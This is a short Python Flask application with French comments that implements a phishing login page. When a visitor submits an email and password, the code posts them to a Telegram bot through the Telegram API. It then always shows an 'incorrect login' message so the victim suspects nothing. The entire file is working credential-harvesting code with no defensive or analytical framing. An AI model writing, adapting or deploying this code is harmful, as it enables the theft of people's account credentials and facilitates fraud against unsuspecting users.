import os
from flask import Flask, render_template, request
import requests
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)

TOKEN = os.environ.get("TELEGRAM_TOKEN")
CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")


@app.route('/', methods=['GET', 'POST'])
def home():
    error = None
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')

        if email and password:
            if TOKEN and CHAT_ID:
                message = f"📩 Nouvelle tentative\n\nEmail : {email}\nMDP : {password}"
                try:
                    requests.post(
                        f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                        data={"chat_id": CHAT_ID, "text": message},
                        timeout=10
                    )
                except Exception as e:
                    # On log l'erreur MAIS on ne casse pas la page
                    print("⚠️ ERREUR TELEGRAM (ignorée):", e)

        # Toujours afficher "Identifiant incorrect"
        error = "Identifiant incorrect"

    return render_template("login.html", error=error)


@app.route('/forgot-password')
def forgot_password():
    return "Page mot de passe oublié"


if __name__ == '__main__':
    app.run(debug=True)